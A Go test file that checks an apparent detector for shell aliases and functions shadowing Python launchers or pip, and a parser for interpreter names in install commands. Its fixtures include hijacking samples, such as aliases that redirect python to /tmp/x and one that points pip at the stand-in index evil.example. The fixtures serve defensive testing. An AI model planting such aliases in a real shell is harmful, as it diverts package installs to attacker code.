package main

import (
	"slices"
	"testing"
)

// PIP-VERSIONED-1 round 3: the agent's own readers take a Python launcher or pip by the reader's pattern — an alias or
// a function that stands in for one moves an install (pmShadow), and pip's configuration is read under the prefix of
// the interpreter the line runs by name (pyNames).
func TestPipVersionedAgentSites(t *testing.T) {
	for line, want := range map[string]string{
		"alias python3.12='python3 -I /tmp/x'": "python3.12", "py() { /tmp/x \"$@\"; }": "py", "alias pip3.12='pip --index-url https://evil.example/simple'": "pip3.12",
		"alias pypy3='pypy3 -X dev'": "pypy3", "function pyw { /tmp/x; }": "pyw", "alias python3='python3 -I'": "python3", "alias pip='pip --user'": "pip", "alias pip3.12=pip3": "",
	} {
		if got := pmShadow(line); got != want {
			t.Errorf("pmShadow(%q) = %q; want %q", line, got, want)
		}
	}
	got, _ := pyNames("python3.12 -m pip install x && py -3 -m pip install y; /opt/bin/pypy3 -m pip install z")
	for _, n := range []string{"pip", "pip3", "python", "python3", "python3.12", "py"} {
		if !slices.Contains(got, n) {
			t.Errorf("pyNames: %q; want %s among them", got, n)
		}
	}
	if slices.Contains(got, "pypy3") {
		t.Errorf("pyNames: %q; a program run by its path is read by its prefix, not looked up", got)
	}
}
